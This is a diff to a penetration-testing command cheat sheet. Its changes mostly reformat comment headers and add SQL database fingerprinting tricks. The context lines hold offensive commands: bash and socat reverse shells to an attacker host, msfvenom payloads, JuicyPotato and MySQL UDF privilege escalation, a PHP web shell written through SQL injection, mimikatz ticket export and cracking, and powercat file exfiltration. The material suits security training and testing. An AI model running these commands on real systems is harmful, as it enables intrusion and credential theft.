@@ -353,11 +353,11 @@ echo $VARIABLE_HERE
 ((value--))
 
 # data streams
-# send from
+## send from
 <
-# write to
+## write to
 >
-# append to
+## append to
 >>
 
 # send STDERR (2) to log file
@@ -377,42 +377,42 @@ read -p 'prompt_here: ' variable_name_here
 read -sp 'prompt_here: ' variable_name_here
 
 # conditions
-# not
+## not
 !
-# and
+## and
 &&
-# or
+## or
 ||
-# equal
+## equal
 =
 -eq
-# not equal
+## not equal
 !=
 -ne
-# greater than
+## greater than
 -gt
-# greater than or equal
+## greater than or equal
 -ge
-# less than
+## less than
 -lt
-# less than or equal
+## less than or equal
 -le
-# file exists
+## file exists
 -e file_name_here
-# directory exists
+## directory exists
 -d file_name_here
-# file exists + not empty
+## file exists + not empty
 -s file_name_here
-# file exists with read permission
+## file exists with read permission
 -r file_name_here
-# file exists with write permission
+## file exists with write permission
 -w file_name_here
-# file exists with execute permission
+## file exists with execute permission
 -x file_name_here
-# test for empty string
-# empty
+## test for empty string
+### empty
 -z string_here
-# length > 0
+### length > 0
 -n string_here
 
 # exit status (0 = succes, else failure)
@@ -423,14 +423,14 @@ bash -i >& /dev/tcp/attacker_IP/port_here 0>&1
 0<&1;exec 1<>/dev/tcp/attacker_IP/port_here; bash <&1 >&1 2>&1
 
 # fix TTY
-#background reverse shell
+## background reverse shell
 Ctrl-Z
-# find tty values on attacker's box
+## find tty values on attacker's box
 echo $TERM
 stty -a
-# fix TTY + foreground reverse shell again
+## fix TTY + foreground reverse shell again
 stty raw -echo && fg
-# back in reverse shell
+## back in reverse shell
 reset
 export SHELL=bash
 export TERM=term_value_here
@@ -647,13 +647,13 @@ mkpasswd -m sha-512 new_password_here
 nmblookup -A IP_here
 
 # import client certificate
-# extract .pem
+## extract .pem
 openssl pkc12 -in certificate_name_here.pfx -nocerts -out certificate_name_here.pem -nodes
-# extract .crt
+## extract .crt
 openssl pkcs12 -in certificate_name_here.pfx -nokeys -out certificate_name_here.crt -nodes
-# copy to /usr/local/share/ca-certificates/
+## copy to /usr/local/share/ca-certificates/
 sudo cp certificate_name_here.crt /usr/local/share/ca-certificates/certificate_name_here.crt
-# update
+## update
 sudo update-ca-certificates
 
 # check for GUI
@@ -1331,12 +1331,12 @@ rename old_file_name new_file_name
 ftp -v -n -s:file_here.txt
 
 # transfer file Win / ftp client -> Lin / ftp server
-# setup ftp server on Lin
+## setup ftp server on Lin
 mkdir ftphome
 sudo systemctl start pure-ftpd
 sudo systemctl restart pure-ftpd # id service already running
 
-# prepare ftp commands on Win or interact with ftp prompt
+## prepare ftp commands on Win or interact with ftp prompt
 echo open IP_here 21 > ftp_commands.txt
 echo USER user_name_here >> ftp_commands.txt
 echo password_here >> ftp_commands.txt
@@ -1344,7 +1344,7 @@ echo bin >> ftp_commands.txt
 echo GET filename_here >> ftp_commands.txt
 echo bye >> ftp_commands.txt
 
-# start session on Win
+## start session on Win
 ftp -v -n -s:ftp_commands.txt
 
 ```
@@ -1612,14 +1612,14 @@ hydra -L SID_wordlist_here -s 1521 IP_here oracle-sid
 /path/to/impacket/psexec.py domain/user@IP_here
 
 # create public share for file transfer Win <--> Lin
-# setup share on Lin
+## setup share on Lin
 /path/to/impacket-smbserver share_name_here full_path_here
-# mount share on Win
-# powershell
+## mount share on Win
+### powershell
 New-PSDrive -Name "share_name_here_can_be_different_from_above" -PSProvider "FileSystem" -Root "\\Lin_IP_here\share_name_here"
-# cmd
+### cmd
 net use unused_letter_here: \\Lin_IP_here\share_name_here
-# access drive
+## access drive
 cd \\Lin_IP_here\share_name_here_can_be_different_from_above\
 ```
 
@@ -1665,9 +1665,9 @@ sudo iptables -nv -L
 ## JARSIGNER
 ```bash
 # sign apk :
-# 1. generate private key
+## generate private key
 keytool -genkey -v -keystore keystore_here -alias alias_here -keyalg RSA -keysize 2048 -validity 7400
-# 2. sign
+## sign
 jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore keystore_here /path/to/apk alias_here
 
 # verify signature
@@ -1703,8 +1703,9 @@ keepass2john db_here.kdbx
 rar2john rar_here
 
 # edit rules
+## open conf file
 sudo nano /etc/john/john.conf
-# add rule description here
+## add rule description here
 new_rule_here
 
 # run multi-process john
@@ -1733,18 +1734,18 @@ jq -r '.[].content_attribute_here' /path/to/json | base64 -d >/path/to/pdf
 ```
 # compile / download exe for arch + upload to victim via low priv shell
 # generate new reverse shell + upload to victim
-# x86
+## x86
 msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x86 -o shell.exe
-# x64
+## x64
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -a x64 -o shell.exe
 
 # start listener on attacker machine
 rlwrap nc -lnvp port_here
 
 # call juicy potato
-# x86
+## x86
 C:\path\to\Juicy.Potato.x86.exe -l port_here -p C:\path\to\rev\shell.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
-# x64
+## x64
 C:\path\to\JuicyPotato.exe -l port_here -p C:\path\to\rev\shell.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
 ```
 
@@ -1765,7 +1766,7 @@ mimkatz # kerberos::list /export
 # crack tickets
 ./tgsrepcrack.py /path/to/wordlist /path/to/kirbi
 # convert kirbi to john
-/path/to/kirbi2john.py /path/to/kirbi > out_file_here
+/path/to/kirbi2john.py /path/to/kirbi > out_file_here
 # crack
 john -w=/path/to/wordlist /path/to/john/file
 ```
@@ -2106,26 +2107,26 @@ UNION all select 1,...,"content_here" into OUTFILE '/path/to/outfile'
 UNION all select 1,...,"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/path/to/outfile'
 
 # get shell via user-defined function (UDF) --> https://www.exploit-db.com/exploits/1518
-# compile shared object / library
+## compile shared object / library
 gcc -g -c raptor_udf2.c
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
-# connect to db
+## connect to db
 mysql -u root -p
-# access mysql database
+## access mysql database
 use mysql;
-# create new table
+## create new table
 create table foo(line blob);
-# import library
+## import library
 insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
-# write library to directory on path
+## write library to directory on path
 select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
-# create UDF
+## create UDF
 create function do_system returns integer soname 'raptor_udf2.so';
-# check import
+## check import
 select * from mysql.func;
-# priv esc to root (if mysqld runs as root!)
+## priv esc to root (if mysqld runs as root!)
 select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
-# spawn root shell
+## spawn root shell
 \! sh
 \! bash
 ```
@@ -2150,7 +2151,7 @@ nbtscan -r IP_here/32
 nc target_IP port_here
 nc -v target_IP port_here
 nc -nv target_IP port_here
-# send CRLF, not only LF
+## send CRLF, not only LF
 nc -nvC target_IP port_here
 
 
@@ -2164,9 +2165,9 @@ nc -nvv -u -z -w time_out_in_seconds_here target_IP port_here
 nc -lnvp port_here
 
 # transfer file (text + binary)
-# listener
+## listener
 nc -lnvp port_here > /path/to/oufile
-# sender
+## sender
 nc -nv listener_IP_here port_here < /path/to/file
 
 # banner grabbing (2 empty lines required between headers + body!)
@@ -2442,13 +2443,13 @@ openssl s_client -connect target_IP:21 -starttls ftp
 openssl req -newkey rsa:2048 -nodes -keyout myprivkey.key -x509 -days 362 -out mycert.crt
 
 # import client certificate
-# extract .pem
+## extract .pem
 openssl pkc12 -in certificate_name_here.pfx -nocerts -out certificate_name_here.pem -nodes
-# extract .crt
+## extract .crt
 openssl pkcs12 -in certificate_name_here.pfx -nokeys -out certificate_name_here.crt -nodes
-# copy to /usr/local/share/ca-certificates/
+## copy to /usr/local/share/ca-certificates/
 sudo cp certificate_name_here.crt /usr/local/share/ca-certificates/certificate_name_here.crt
-# update
+## update
 sudo update-ca-certificates
 ```
 
@@ -2501,17 +2502,18 @@ passthru()
 ## PIP & PIP3
 ```python
 # install pip package
-# PY2
+## PY2
 python -m pip install package
 pip install package
-#PY3
+## PY3
 python3 -m pip install package
 pip3 install package
 
 # install specific package version
+## PY2
 python -m pip install package==version_here
 pip install package==version_here
-#PY3
+## PY3
 python3 -m pip install package==version_here
 pip3 install package==version_here
 
@@ -2588,9 +2590,9 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 . .\powercat.ps1
 
 # transfer file
-# listen
+## listen
 nc -lnvp port_here > /path/to/outfile
-# send
+## send
 powercat -c attacker_IP -p port_here -i C:\path\to\infile
 
 # reverse shell
@@ -2916,15 +2918,16 @@ reg save HKLM\SECURITY C:\path\to\copy\location\SECURITY.save
 
 ## RINETD
 ```bash
-# configure port forwarding rule for target  on proxy
+# configure port forwarding rule for target on proxy
+## open config file
 sudo nano /etc/rinetd.conf 
-# bindadress    bindport  connectaddress  connectport
+## bindadress    bindport  connectaddress  connectport
 0.0.0.0 listening_port_on_proxy dest_IP dest_port
-# restart service
+## restart service
 sudo service rinetd restart
-# verify listener
+## verify listener
 ss -plant | grep listening_port_on_proxy
-# connect to destination from target
+## connect to destination from target
 nc -nvv proxy_IP_here listener_port_here
 ```
 
@@ -3357,26 +3360,26 @@ socat TCP4-LISTEN:port_here,fork file:infile_here
 socat TCP4:target_IP:port_here file:outfile_here,create
 
 # reverse shell
-# listener
+## listener
 socat -d -d TCP4-LISTEN:port_here STDOUT
-# push shell
+## push shell
 socat TCP4:attacker_IP:port_here EXEC:/bin/bash
 
 # encrypted bind shell
-# genereate self-signed cert
+## genereate self-signed cert
 openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 363 -out shell.crt
-# combine cert + private key into .pem
+## combine cert + private key into .pem
 cat shell.key shell.crt > shell.pem
-# set up listener on target, no SSL cert validation
+## set up listener on target, no SSL cert validation
 socat OPENSSL-LISTENER:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
-# connect from attacker machine
+## connect from attacker machine
 socat - OPENSSL:target_IP:443,verify=0
 ```
 
 
 
 ## SQL
-```
+```sql
 # determine no. of columns in table : (error - 1) =  no_columns
 ORDER BY increasing_no_here
 
@@ -3392,6 +3395,17 @@ UNION ALL SELECT 1,2,...,no_columns_here
 # ASCII math = 2
 67-ASCII('A')
 51-ASCII(1)
+
+# fingerprint database
+## strings
+'wurzel'||'sepp' # Oracle
+'wurzel'+'sepp' # MS-SQL
+'wurzel' 'sepp' # MySQL
+
+## numeric data : 0 on target db, error on any other db
+BITAND(1,1)-BITAND(1,1) # Oracle
+@@PACK_RECEIVED-@@PACK_RECEIVED # MS-SQL
+CONNECTION_ID()-CONNECTION_ID() # MySQL
 ```
 
 
@@ -3453,12 +3467,12 @@ python /path/to/sqlmap -r req.txt -p param_to_attack --os-shell
 python /path/to/sqlmap -r req.txt -p param_to_attack --timeout=300
 
 # techniques
-# B = boolean-based blind
-# E = error-based
-# U = union query-based
-# S = stacked queries
-# T = time-based blind
-# Q = inline queries
+## B = boolean-based blind
+## E = error-based
+## U = union query-based
+## S = stacked queries
+## T = time-based blind
+## Q = inline queries
 --technique BEUSTQ
 
 # check which users webapp runs as
@@ -3652,7 +3666,7 @@ prefix + alt + shift + p
 
 
 ## TNSCMD
-```
+```bash
 # ping Oracle TNS listener
 tnscmd10g -h IP_here -p 1521
 
@@ -3811,18 +3825,18 @@ virtualenv venv
 virtualenv --python=pythonversion_here venv
 
 # activate virtual environment
-# Linux
+## Linux
 source venv/bin/activate
-# Win
+## Win
 . venv/Scripts/activate
 
 # deactivate virtual environment
 deactivate
 
 # delete virtual environment
-# Linux
+## Linux
 rm -rf venv
-# Win
+## Win
 del venv
 ```
 
